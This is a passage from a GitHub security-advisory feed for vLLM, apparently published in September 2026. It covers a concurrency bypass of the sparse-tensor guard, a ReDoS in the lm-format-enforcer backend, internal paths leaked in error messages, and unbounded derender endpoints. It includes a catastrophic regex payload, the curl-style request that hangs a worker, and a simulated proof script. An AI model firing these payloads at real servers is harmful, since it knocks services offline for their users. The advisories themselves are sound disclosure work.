<li>Commit <a href="https://github.com/vllm-project/vllm/commit/84e23d103d3483f944780d0d42bcf0993fd27e3a"><code>84e23d103d3483f944780d0d42bcf0993fd27e3a</code></a> on 2025-12-15, titled <code>additional protection for CVE-2025-62164 (#30649)</code>, added the process-global sparse-invariant context around load, type check, and dense conversion.</li>
<li>Refactor commit <a href="https://github.com/vllm-project/vllm/commit/f0a1c8453ad1c664c8a04c83fe545195fcd556eb"><code>f0a1c8453ad1c664c8a04c83fe545195fcd556eb</code></a> on 2026-01-31 moved the guarded loader into <code>vllm/renderers/embed_utils.py</code> while preserving the same context.</li>
<li>Chat content-part commit <a href="https://github.com/vllm-project/vllm/commit/14043dfecd35dd2f12b4d51eb9fa166184a0ca0f"><code>14043dfecd35dd2f12b4d51eb9fa166184a0ca0f</code></a> on 2026-05-01 introduced <code>prompt_embeds</code> chat parts and the concurrent one-request schedule described here.</li>
</ul>
<p>This report therefore does not present the malformed sparse payload or <code>to_dense()</code> sink as new. It reports a distinct concurrency root cause and trigger: unsynchronized save/enable/restore of the process-global follow-up guard, reachable through the later multi-part chat scheduler.</p>
<p>The affected revision pins PyTorch 2.11.0 in <code>pyproject.toml:10</code>.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>The target's <code>safe_load_prompt_embeds</code> performs the guarded operation in <code>vllm/renderers/embed_utils.py:16-39</code>:</p>
<pre><code class="language-python">with torch.sparse.check_sparse_tensor_invariants():
    tensor = torch.load(
        BytesIO(pybase64.b64decode(embed, validate=True)),
        weights_only=True,
        map_location=torch.device("cpu"),
    )
    if not isinstance(tensor, torch.Tensor):
        raise VLLMValidationError(...)
    tensor = tensor.to_dense()
</code></pre>
<p>The context is not request-local. With the global flag initially disabled, we can describe the verified interleaving:</p>
<ol>
<li>Benign part A enters, saves <code>False</code>, and enables the flag.</li>
<li>Malicious part B enters, saves <code>True</code>, and leaves the flag enabled.</li>
<li>A completes its load and exits, restoring its saved <code>False</code> value.</li>
<li>B remains lexically inside its context but observes the actual global flag as <code>False</code>.</li>
<li>B's <code>torch.load(..., weights_only=True)</code> reconstructs the malformed sparse tensor.</li>
<li>The target reaches <code>tensor.to_dense()</code> before later rank, hidden-size, and dtype checks.</li>
</ol>
<p><code>weights_only=True</code> constrains deserialization types; it does not compensate for a sparse invariant check that another request has disabled.</p>
<p>The complete stock actor-to-sink chain, traced in the affected source, is:</p>
<p><code>POST /v1/chat/completions</code> (<code>vllm/entrypoints/openai/chat_completion/api_router.py:41-61</code>) -&gt; <code>OpenAIServingChat.create_chat_completion</code> -&gt; <code>_create_chat_completion</code> -&gt; <code>render_chat_request</code> (<code>vllm/entrypoints/openai/chat_completion/serving.py:206-280</code>) -&gt; <code>OnlineRenderer.render_chat</code> (<code>vllm/renderers/online_renderer.py:95-190</code>) -&gt; <code>preprocess_chat</code> (<code>vllm/renderers/online_renderer.py:335-380</code>) -&gt; <code>BaseRenderer.render_chat_async</code> (<code>vllm/renderers/base.py:1070-1105</code>) -&gt; <code>HfRenderer.render_messages_async</code> (<code>vllm/renderers/hf.py:1049-1085</code>) -&gt; <code>parse_chat_messages_async</code> (<code>vllm/entrypoints/chat_utils.py:1911-1945</code>) -&gt; content-part <code>parse_prompt_embeds</code> and <code>_load_prompt_embeds_async</code> (<code>vllm/entrypoints/chat_utils.py:1099-1120</code>) -&gt; <code>AsyncMultiModalItemTracker.resolve_items</code> (<code>vllm/entrypoints/chat_utils.py:818-835</code>) -&gt; <code>asyncio.gather</code> of both prompt parts -&gt; <code>safe_load_prompt_embeds_async</code> -&gt; <code>make_async</code> -&gt; <code>loop.run_in_executor(executor=None, ...)</code> (<code>vllm/utils/async_utils.py:28-45</code>) -&gt; guarded <code>torch.load</code> -&gt; <code>to_dense()</code>.</p>
<p>The prompt async helper is created without an explicit executor, so it uses the event loop's default executor. This path is separate from the renderer's configurable pool. The deterministic scheduler run observed the two parts on distinct default-executor threads while leaving <code>renderer_num_workers</code> at its default of one.</p>
<p><code>prompt_embeds</code> bypasses multimodal processing, and the tracker explicitly permits it when <code>is_multimodal_model=False</code> (<code>vllm/entrypoints/chat_utils.py:793-837</code>). Consequently, the primary trigger needs neither a multimodal model nor <code>enable_mm_embeds</code>.</p>
<p>The source also states that async wrappers must be thread-safe (<code>vllm/utils/async_utils.py:28-38</code>), while a target test acknowledges that the sparse flag is not thread-local and concurrent users can leak state (<code>tests/renderers/test_sparse_tensor_validation.py:58-61</code>).</p>
<h2 id="exploitability-analysis">Exploitability Analysis</h2>
<p>The following evidence labels separate what was demonstrated from what remains conditional:</p>
<table>
<thead>
<tr>
<th>Label</th>
<th>Claim</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Verified by run</strong></td>
<td>PyTorch 2.11.0 rejects the identical invalid payload through the actual target loader without the race.</td>
</tr>
<tr>
<td><strong>Verified by run</strong></td>
<td>The hash-verified frozen tracker schedules two prompt parts on distinct default-executor threads, races the flag to <code>False</code>, reconstructs the invalid sparse tensor, and reaches the target <code>to_dense()</code> call while the interception prevents execution.</td>
</tr>
<tr>
<td><strong>Traced in source</strong></td>
<td>A client can supply multiple <code>prompt_embeds</code> content parts through the stock <code>/v1/chat/completions</code> route and the function chain above.</td>
</tr>
<tr>
<td><strong>Traced in source</strong></td>
<td><code>enable_prompt_embeds</code> defaults to <code>False</code> (<code>vllm/config/model.py:255-260</code>), so the operator must opt in. <code>enable_mm_embeds</code> and non-default renderer workers are not preconditions for this path.</td>
</tr>
<tr>
<td><strong>Traced in source</strong></td>
<td><code>api_key</code> defaults to <code>None</code> (<code>vllm/entrypoints/openai/cli_args.py:264</code>), and authentication middleware is installed only when a CLI or environment key is present (<code>vllm/entrypoints/openai/api_server.py:306-310</code>). With a configured key, the attacker must authenticate; without one, the stock route has no API-key middleware.</td>
</tr>
<tr>
<td><strong>Unrun</strong></td>
<td>A live HTTP/GPU server, real-world race win rate, unsafe dense conversion, process crash, memory corruption, and reliable code execution.</td>
</tr>
</tbody></table>
<p>The feature is documented for trusted users, which narrows intended exposure. It is not a memory-safety boundary: a user authorized to submit embedding inputs should not be able to disable a process-wide invariant for concurrent work.</p>
<p>The current run proves the same invalid sparse object can cross the guard and reach the historical sink. If executing that sink retains the behavior described in CVE-2025-62164 for the deployed PyTorch build, denial of service or memory corruption may follow. This is a conditional impact statement, not a reproduced outcome. Reliable RCE is not claimed.</p>
<p>The opt-in feature, scheduling requirement, and absence of a measured live win rate support <strong>Medium/P2</strong> despite the serious historical sink class. No additional deployment assumptions are required for the one-request scheduler beyond stock default-executor concurrency being available.</p>
<h2 id="remediation">Remediation</h2>
<p>The immediate fix is one shared process-wide lock around every use of this process-global sparse guard. The lock must cover invariant enabling, deserialization, tensor type validation, and dense conversion:</p>
<pre><code class="language-python">with shared_sparse_load_lock:
    with torch.sparse.check_sparse_tensor_invariants():
        tensor = torch.load(..., weights_only=True, map_location="cpu")
        validate_tensor_type(tensor)
        tensor = tensor.to_dense()
</code></pre>
<p>Every prompt, image, and audio loader that manipulates the same global flag must use the same lock. A lock only around <code>torch.load</code>, separate per-loader locks, or a lock omitted from the chat helper would leave overlapping save/restore sequences possible.</p>
<p>The stronger design is to avoid mutable process-global validation state in concurrent request code. Prefer a PyTorch per-call invariant check if one is available, or reconstruct and validate serialized embeddings inside a deliberately serialized boundary before any sparse operation.</p>
<p>Regression coverage should:</p>
<ul>
<li>Preserve the actual-target negative control using the identical malformed payload.</li>
<li>Force A-enter, B-enter, A-exit, B-load and assert B remains protected.</li>
<li>Execute the multi-part chat tracker with the event loop's default executor and <code>renderer_num_workers=1</code>.</li>
<li>Cover cross-loader overlap so later prompt, image, or audio changes cannot bypass a shared fix.</li>
<li>Assert the global flag is restored after success and exceptions.</li>
<li>Reject invalid tensors before any dense conversion.</li>
</ul>
<p>Until a fix is deployed, leaving <code>enable_prompt_embeds</code> disabled removes this stock source path.</p>
<h2 id="summary">Summary</h2>
<p>The affected vLLM revision uses a process-global PyTorch context as the follow-up protection for CVE-2025-62164. A later chat feature causes two prompt-embedding parts from one request to run concurrently on the default executor. One context can restore the flag to <code>False</code> while the other is still guarded, allowing the historical malformed sparse payload class to reach the historical <code>to_dense()</code> sink. The new issue is the concurrent guard bypass and shipped trigger, not the payload or sink. Runtime validation proves the bypass and safe sink reachability on PyTorch 2.11.0; historical crash and memory-corruption effects remain conditional, and RCE was not tested or claimed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-pr7f-p5mw-fc87">https://github.com/vllm-project/vllm/security/advisories/GHSA-pr7f-p5mw-fc87</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73557">https://nvd.nist.gov/vuln/detail/CVE-2026-73557</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/48583">https://github.com/vllm-project/vllm/pull/48583</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/793cf79c89d4049124e756915468ac30318f2e50">https://github.com/vllm-project/vllm/commit/793cf79c89d4049124e756915468ac30318f2e50</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
<li><a href="https://github.com/advisories/GHSA-pr7f-p5mw-fc87">https://github.com/advisories/GHSA-pr7f-p5mw-fc87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pr7f-p5mw-fc87</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-04T21:39:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: ReDoS via structured_outputs.regex in the lm-format-enforcer backend (no compile timeout) — missed sibling of GHSA-rwxx-mrjm-wc2m]]></title>
        <id>https://github.com/advisories/GHSA-48jh-3gj7-fg8v</id>
        <link href="https://github.com/advisories/GHSA-48jh-3gj7-fg8v"/>
        <updated>2026-09-04T21:37:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The fix for <code>GHSA-rwxx-mrjm-wc2m</code> ("ReDoS via <code>structured_outputs.regex</code> compiled without timeout") wrapped the regex compile in the <strong>xgrammar</strong> and <strong>outlines</strong> backends with <code>compile_regex_with_timeout</code> (and, for outlines, <code>validate_regex_is_buildable</code>). The <strong>lm-format-enforcer</strong> backend was left unguarded: it compiles the attacker-supplied regex with no timeout and no buildability check. A single request with a catastrophic regex hangs the structured-output compile step and stalls the engine worker (denial of service).</p>
<h3 id="affected-code-head-d6d39c1">Affected code (HEAD d6d39c1)</h3>
<p><code>vllm/v1/structured_output/backend_lm_format_enforcer.py</code>:</p>
<ul>
<li>line 110: <code>character_level_parser = lmformatenforcer.RegexParser(grammar_spec)</code> — builds an <code>interegular</code> FSM from the attacker regex synchronously, <strong>no timeout</strong>.</li>
<li>line 155: <code>validate_structured_output_request_lm_format_enforcer</code> returns immediately on <code>if so_params.regex:</code> — <strong>no validation</strong>.</li>
</ul>
<p>Sibling backends that WERE patched by GHSA-rwxx:</p>
<ul>
<li><code>backend_xgrammar.py:92</code> → <code>compile_regex_with_timeout(...)</code>.</li>
<li><code>backend_outlines.py:65</code> → <code>compile_regex_with_timeout(...)</code> (plus <code>validate_regex_is_buildable</code>).</li>
</ul>
<p>lm-format-enforcer uses the same <code>interegular</code> DFA-construction primitive the advisory cites for the outlines backend.</p>
<h3 id="reproduction-runtime-verified-against-the-sink">Reproduction (runtime-verified against the sink)</h3>
<p>The sink <code>lmformatenforcer.RegexParser(&lt;regex&gt;)</code> was exercised directly (this is exactly what the backend calls):</p>
<pre><code>baseline  '[0-9]{3}'          -&gt; 0.0002 s
attacker  '(a{1,300}){300}'   -&gt; DID NOT COMPLETE in 20 s (one core pegged at 100% in interegular FSM construction)
</code></pre>
<p>End-to-end: start <code>vllm serve &lt;model&gt; --structured-outputs-config '{"backend":"lm-format-enforcer"}'</code>, then <code>POST /v1/completions</code> with <code>{"structured_outputs":{"regex":"(a{1,300}){300}"}, ...}</code>. The request never returns; because grammar compile runs in the engine's structured-output path, concurrent requests stall = worker-level DoS. The identical request against the outlines backend is bounded by <code>compile_regex_with_timeout</code> and returns a clean error.</p>
<h3 id="impact">Impact</h3>
<p>Unauthenticated denial of service (vLLM ships with no authentication by default). One request pegs a CPU core and blocks the structured-output engine path.</p>
<p><strong>Reachability precondition:</strong> the operator must have selected <code>backend=lm-format-enforcer</code> via <code>--structured-outputs-config</code> (the default is <code>auto</code> → xgrammar). This is the same opt-in tier as the outlines backend that GHSA-rwxx already covered.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Route the lm-format-enforcer regex compile (<code>backend_lm_format_enforcer.py:110</code>) through the same <code>compile_regex_with_timeout</code> guard already applied to the xgrammar and outlines backends, and reject un-buildable / oversized patterns in <code>validate_structured_output_request_lm_format_enforcer</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-48jh-3gj7-fg8v">https://github.com/vllm-project/vllm/security/advisories/GHSA-48jh-3gj7-fg8v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73556">https://nvd.nist.gov/vuln/detail/CVE-2026-73556</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/47595">https://github.com/vllm-project/vllm/pull/47595</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/c9a788eedc412acceaa5112e0d44624b49841577">https://github.com/vllm-project/vllm/commit/c9a788eedc412acceaa5112e0d44624b49841577</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
<li><a href="https://github.com/advisories/GHSA-48jh-3gj7-fg8v">https://github.com/advisories/GHSA-48jh-3gj7-fg8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-48jh-3gj7-fg8v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-04T21:37:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Unauthenticated Internal Path and Username Disclosure via Validation Error Messages]]></title>
        <id>https://github.com/advisories/GHSA-hwrm-c4cx-rf4j</id>
        <link href="https://github.com/advisories/GHSA-hwrm-c4cx-rf4j"/>
        <updated>2026-09-04T21:36:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When the vLLM API receives a malformed request (e.g., invalid JSON or missing required fields), FastAPI raises a Pydantic <code>RequestValidationError</code>. The <code>validation_exception_handler</code> in <code>vllm/entrypoints/openai/server_utils.py</code> converts this exception to a string via <code>str(exc)</code>, which includes the internal file path and line number of the handler function. The existing <code>sanitize_message()</code> function in <code>vllm/entrypoints/utils.py</code> strips memory addresses (e.g., <code>0x7f...</code>) but does not strip <code>File "...", line X</code> patterns. The result is a user-facing HTTP response that leaks internal system information.</p>
<h2 id="impact">Impact</h2>
<p>An unauthenticated attacker can extract the following with a single malformed request:</p>
<ul>
<li><strong>OS username</strong> running the vLLM process (e.g., <code>ubuntu</code>)</li>
<li><strong>Home directory path</strong> (e.g., <code>/home/ubuntu/</code>)</li>
<li><strong>Virtual environment path</strong> (e.g., <code>vllm-env/</code>)</li>
<li><strong>Python version</strong> (e.g., <code>3.12</code>)</li>
<li><strong>Internal package structure and line numbers</strong> (e.g., <code>vllm/entrypoints/openai/chat_completion/api_router.py</code>)</li>
<li><strong>Handler function names per endpoint</strong>, enabling precise version fingerprinting</li>
</ul>
<p>This information aids attackers in constructing targeted exploits: environment paths narrow the attack surface, and handler function names + line numbers enable exact version identification even when the <code>/version</code> endpoint is disabled.</p>
<p>All POST endpoints that accept JSON bodies are affected, including <code>/v1/chat/completions</code>, <code>/v1/completions</code>, <code>/tokenize</code>, and <code>/detokenize</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Deploying vLLM behind a reverse proxy that rewrites error response bodies to strip file paths would mitigate this, though it is fragile.</p>
<h2 id="remediation-recommendation">Remediation Recommendation</h2>
<p>Two possible fixes (either suffices):</p>
<p><strong>Option A — Fix <code>validation_exception_handler</code>:</strong> Construct the error message from <code>exc.errors()</code> (the structured Pydantic error list) rather than <code>str(exc)</code>. This avoids the traceback-style string entirely.</p>
<p><strong>Option B — Fix <code>sanitize_message</code>:</strong> Add a regex to strip <code>File "...", line \d+</code> patterns, similar to how memory addresses are already stripped:</p>
<pre><code class="language-python">import re
msg = re.sub(r'File ".*?", line \d+, in \w+', '[internal]', msg)
</code></pre>
<p>Option A is preferred as it addresses the root cause rather than filtering symptoms.</p>
<h2 id="environment-tested">Environment Tested</h2>
<ul>
<li>vLLM 0.20.1 (pip install, latest stable as of May 2026)</li>
<li>Python 3.12</li>
<li>Ubuntu 22.04</li>
<li>Model: Qwen/Qwen2-0.5B (text-only; bug is model-independent)</li>
</ul>
<p>This was fixed here: <a href="https://github.com/vllm-project/vllm/commit/e87521626f">https://github.com/vllm-project/vllm/commit/e87521626f</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hwrm-c4cx-rf4j">https://github.com/vllm-project/vllm/security/advisories/GHSA-hwrm-c4cx-rf4j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73555">https://nvd.nist.gov/vuln/detail/CVE-2026-73555</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/46415">https://github.com/vllm-project/vllm/pull/46415</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/e87521626febe2763f997691d1599de4175f4324">https://github.com/vllm-project/vllm/commit/e87521626febe2763f997691d1599de4175f4324</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
<li><a href="https://github.com/advisories/GHSA-hwrm-c4cx-rf4j">https://github.com/advisories/GHSA-hwrm-c4cx-rf4j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwrm-c4cx-rf4j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-04T21:36:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Derender endpoints decode caller-supplied GenerateResponse token IDs without output bounds]]></title>
        <id>https://github.com/advisories/GHSA-8737-qx52-hjff</id>
        <link href="https://github.com/advisories/GHSA-8737-qx52-hjff"/>
        <updated>2026-09-04T21:32:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/v1/completions/derender</code> and <code>/v1/chat/completions/derender</code> endpoints accept caller-supplied <code>GenerateResponse</code> objects and postprocess every nested <code>choices[*].token_ids</code> list directly. Unlike the normal render/generate path, derender does not enforce model context length, resolved <code>max_tokens</code>, <code>max_num_seqs</code>, choice-count, or response-size bounds before detokenizing and returning the supplied token IDs. An authenticated API client can therefore make the CPU-only render frontend, or any server exposing these <code>/v1</code> derender routes, spend CPU and memory proportional to attacker-chosen generated-output-shaped JSON rather than to a bounded generation result.</p>
<h2 id="technical-details">Technical Details</h2>
<p>The render router registers <code>/v1/chat/completions/derender</code> and <code>/v1/completions/derender</code> in <code>vllm/entrypoints/serve/render/api_router.py</code>, and the OpenAI API server attaches this router whenever <code>"generate"</code> or <code>"render"</code> is in <code>supported_tasks</code> (<code>vllm/entrypoints/openai/api_server.py</code>). The routes are under <code>/v1</code>, so they are part of the OpenAI-compatible HTTP API surface and are protected by the API-key middleware when <code>--api-key</code> is configured.</p>
<p>The request types trust generated-output-shaped data from the client. In <code>vllm/entrypoints/serve/disagg/protocol.py</code>, <code>GenerateResponseChoice</code> accepts <code>token_ids: list[int] | None = None</code>, <code>GenerateResponse</code> accepts <code>choices: list[GenerateResponseChoice]</code>, and <code>DerenderCompletionRequest</code> accepts <code>generate_responses: list[GenerateResponse]</code>. These fields have no max length, max item count, or relationship to a prior <code>GenerateRequest</code>.</p>
<p>The sink is <code>OnlineDerenderer</code>. <code>derender_completion()</code> iterates every supplied <code>generate_responses</code> entry and every nested choice, calls <code>tokenizer.decode(choice.token_ids, skip_special_tokens=True)</code>, appends the decoded text to the response choices, and increments <code>total_completion_tokens</code> from the same supplied list length. <code>derender_chat()</code> has the same shape for a single supplied <code>generate_response</code>, and can also feed the decoded text into tool/reasoning parsers when a parser and <code>chat_request</code> are present. <code>ServingRender.derender_completion_response()</code> calls <code>online_derenderer.derender_completion(request.generate_responses, request.prompt_tokens)</code> before applying any completion-level validation beyond the model check.</p>
<p>Normal render and generation paths derive output limits from <code>max_model_len</code>, the rendered prompt length, request <code>max_tokens</code> / <code>max_completion_tokens</code>, and scheduler limits. Derender bypasses that invariant because it accepts the already-generated output shape directly from the HTTP caller. The missing invariant is: derender should only postprocess bounded generated output, and client-supplied derender payloads must be rejected if their nested generated token/logprob structures exceed the same limits that generation would have enforced.</p>
<h2 id="pov">PoV</h2>
<p>The following bounded PoV can be run from a current vLLM checkout containing PR <code>#43606</code>. It asserts the current source facts for the derender routes, unchecked request fields, and decode sink, then simulates the same derender loop with a counting tokenizer. The negative control is a one-choice, 32-token response. The amplified payload keeps the test bounded but demonstrates that all decoded work and returned text scale directly with caller-supplied <code>GenerateResponse</code> contents.</p>
<pre><code class="language-python">#!/usr/bin/env python3
import subprocess
from dataclasses import dataclass
from pathlib import Path

SOURCE = Path(".")

def require_source_fact(path: str, needles: list[str]) -&gt; None:
    text = (SOURCE / path).read_text()
    missing = [needle for needle in needles if needle not in text]
    if missing:
        raise AssertionError(f"{path} missing expected facts: {missing}")

def source_head() -&gt; str:
    return subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=SOURCE, text=True).strip()

@dataclass
class Choice:
    index: int
    token_ids: list[int]

@dataclass
class GenerateResponse:
    request_id: str
    choices: list[Choice]

class CountingTokenizer:
    def __init__(self) -&gt; None:
        self.decode_calls = 0
        self.decoded_ids = 0
    def decode(self, token_ids: list[int], *, skip_special_tokens: bool = True) -&gt; str:
        self.decode_calls += 1
        self.decoded_ids += len(token_ids)
        return "x" * len(token_ids)

def derender_completion_like_current_head(generate_responses: list[GenerateResponse], tokenizer: CountingTokenizer) -&gt; tuple[int, int, int]:
    output_chars = 0
    choices = 0
    total_completion_tokens = 0
    for gen in generate_responses:
        for choice in gen.choices:
            if not choice.token_ids:
                raise ValueError("choice has empty or null token_ids")
            decoded_text = tokenizer.decode(choice.token_ids, skip_special_tokens=True)
            output_chars += len(decoded_text)
            total_completion_tokens += len(choice.token_ids)
            choices += 1
    return choices, total_completion_tokens, output_chars

def make_payload(responses: int, choices_per_response: int, tokens_per_choice: int) -&gt; list[GenerateResponse]:
    token_ids = [42] * tokens_per_choice
    return [GenerateResponse(request_id=f"gen-{r}", choices=[Choice(index=c, token_ids=list(token_ids)) for c in range(choices_per_response)]) for r in range(responses)]

def run_case(name: str, payload: list[GenerateResponse]) -&gt; None:
    tokenizer = CountingTokenizer()
    choices, completion_tokens, output_chars = derender_completion_like_current_head(payload, tokenizer)
    print(f"{name}: responses={len(payload)} choices={choices} decode_calls={tokenizer.decode_calls} decoded_token_ids={tokenizer.decoded_ids} completion_tokens={completion_tokens} output_chars={output_chars}")

require_source_fact("vllm/entrypoints/serve/render/api_router.py", ['"/v1/completions/derender"', '"/v1/chat/completions/derender"', "app.include_router(router)"])
require_source_fact("vllm/entrypoints/serve/disagg/protocol.py", ["class GenerateResponseChoice(BaseModel):", "token_ids: list[int] | None = None", "class GenerateResponse(BaseModel):", "choices: list[GenerateResponseChoice]", "class DerenderCompletionRequest(BaseModel):", "generate_responses: list[GenerateResponse]"])
require_source_fact("vllm/renderers/online_derenderer.py", ["async def derender_completion(", "for gen, pt in zip(generate_responses, prompt_tokens_list):", "for choice in gen.choices:", "decoded_text = tokenizer.decode(", "total_completion_tokens += len(choice.token_ids)"])
print("source_checks=ok")
print(f"source_head={source_head()}")
run_case("negative_control", make_payload(responses=1, choices_per_response=1, tokens_per_choice=32))
run_case("amplified_payload", make_payload(responses=16, choices_per_response=4, tokens_per_choice=8192))
print("observation=derender decodes every caller-supplied token id before any max_model_len, max_tokens, max_num_seqs, or response-size check")
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker with access to the <code>/v1</code> API can send derender requests that consume CPU and memory in the frontend/postprocessing process and can cause large responses unrelated to any bounded generation. In disaggregated deployments, this affects the CPU-only render frontend; in servers where the render router is attached alongside generation, it affects the same OpenAI-compatible server process that handles normal client traffic. This can degrade availability for other clients sharing the process.</p>
<p>Likely CWE: CWE-400 (Uncontrolled Resource Consumption) / CWE-770 (Allocation of Resources Without Limits or Throttling). Conservative CVSS v3.1: <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L</code> (4.3). This is not Low severity because a regular network API client can induce availability impact in a shared service without local access, invalid model artifacts, or special runtime privileges. If the server is deployed without API-key enforcement for <code>/v1</code>, the privileges component becomes <code>PR:N</code>.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Validate derender payloads before any detokenization or parser invocation. Apply bounded limits to <code>generate_response(s)</code>, <code>choices</code>, <code>token_ids</code>, <code>prompt_logprobs</code>, <code>logprobs.content</code>, <code>top_logprobs</code>, and <code>routed_experts</code> that are at least as strict as the corresponding generation-side limits. For completions, reject <code>generate_responses</code> counts above the number of prompts that <code>/v1/completions/render</code> would have produced, and reject total nested choice counts above <code>max_num_seqs</code> / <code>n</code> limits. For each choice, reject <code>token_ids</code> longer than the resolved output-token budget, or require derender callers to submit the original bounded <code>GenerateRequest</code> / sampling metadata and validate the <code>GenerateResponse</code> against it before decoding.</p>
<p>Add regression tests for both derender endpoints. The tests should show that a normal bounded derender payload succeeds, while oversized <code>generate_responses</code>, oversized <code>choices</code>, oversized <code>token_ids</code>, and oversized logprob/top-logprob structures are rejected before <code>tokenizer.decode()</code> or parser execution.</p>
<h2 id="affected-packageversions">Affected Package/Versions</h2>
<p>Confirmed affected: current main at <code>ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a</code> and downstream/nightly builds that include the derender endpoints introduced by PR <code>#43606</code>. The derender router, request models, decode sink, render serving bridge, and OpenAI API router attachment have no relevant diff from <code>00e045b7c7b82599f626779e111233abd4d0a64e</code> to <code>ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a</code>.</p>
<p>Latest release checked: <code>v0.23.0</code>, published on <code>2026-06-15</code>. Its <code>vllm/entrypoints/serve/render/api_router.py</code> does not expose <code>/v1/completions/derender</code> or <code>/v1/chat/completions/derender</code>, so <code>v0.23.0</code> was not confirmed affected.</p>
<h2 id="advisory-history">Advisory History</h2>
<p>PR <code>#43606</code> ("[Render] Add <code>/derender</code> endpoints for disaggregated postprocessing") introduced the derender endpoints on main. PR <code>#44285</code> later refactored the render serving code, and current head still contains the unchecked derender flow.</p>
<p>Public issue search for <code>derender GenerateResponse token_ids</code> returned no reports. Public search for <code>"/v1/completions/derender"</code> returned the derender feature RFC <code>#42729</code> and unrelated bugs, but no size-bound, DoS, or generated-output postprocessing issue.</p>
<p>Related public request-fanout and resource-bound advisories are distinct:</p>
<ul>
<li><code>GHSA-3mwp-wvh9-7528</code> covers an unbounded <code>n</code> parameter on the normal OpenAI completion/chat generation routes. Its root cause is missing upper-bound validation for generated sequence count, its sink is request fanout and request-object copying into the async engine path before scheduling, its precondition is a caller-controlled <code>n</code>, and its fix surface is a cap on generated sequence count. This report reaches <code>/v1/completions/derender</code> and <code>/v1/chat/completions/derender</code>, not the normal generate routes; its root cause is unchecked caller-supplied <code>GenerateResponse</code> / <code>choices</code> / <code>token_ids</code> structures, its sink is <code>OnlineDerenderer</code> detokenization and response construction after generation, its precondition is access to the derender API with generated-output-shaped JSON, and its fix surface is derender payload validation before decode.</li>
<li>PR <code>#45390</code> includes the <code>GHSA-83mh-6mwq-3hg9</code> batch-message fanout fix class: it bounds the outer <code>BatchChatCompletionRequest.messages</code> conversation list to prevent one request from creating many conversation/request objects before normal generation. This report has no batch conversation list and does not rely on <code>n</code>; one derender request can instead supply oversized nested <code>GenerateResponse</code> choices and token IDs that are detokenized and returned directly. A batch-message <code>max_length</code> limit would not bound derender <code>generate_response(s)</code> or per-choice token/logprob structures.</li>
</ul>
<p>The completed local report titled "Explicit truncation_side disables tokenizer-level prompt truncation" is also distinct. That report used <code>/v1/completions</code> and <code>/v1/chat/completions</code> with ordinary prompt text plus <code>truncate_prompt_tokens</code> and explicit <code>truncation_side</code>; its root cause was the renderer omitting tokenizer-level <code>max_length</code> and the pre-tokenization character guard before post-token slicing; its sink was prompt tokenization; and its fix surface was preserving tokenizer-level truncation or rejecting over-budget prompts before tokenization. This derender report uses <code>/v1</code> derender routes, has no prompt text tokenization or truncation-side control, starts from caller-supplied generated-output token IDs, and needs aggregate bounds on derender <code>generate_response(s)</code>, choices, token IDs, logprobs, parser inputs, and response construction before detokenization.</p>
<p>Other adjacent vLLM advisories for Rust/gRPC token-id and logprob bounds, structured-output grammar amplification, repetition-detection windows, and pooling/rerank batch fanout are distinct. Those issues affect Rust/gRPC request conversion, grammar compilation, scheduler loops, or engine fanout. This issue affects <code>/v1</code> derender postprocessing of caller-supplied generated-output objects and requires derender-specific request validation before detokenization.</p>
<h2 id="resources">Resources</h2>
<ul>
<li><code>vllm/entrypoints/serve/render/api_router.py</code></li>
<li><code>vllm/entrypoints/serve/disagg/protocol.py</code></li>
<li><code>vllm/renderers/online_derenderer.py</code></li>
<li><code>vllm/entrypoints/serve/render/serving.py</code></li>
<li><code>vllm/entrypoints/openai/api_server.py</code></li>
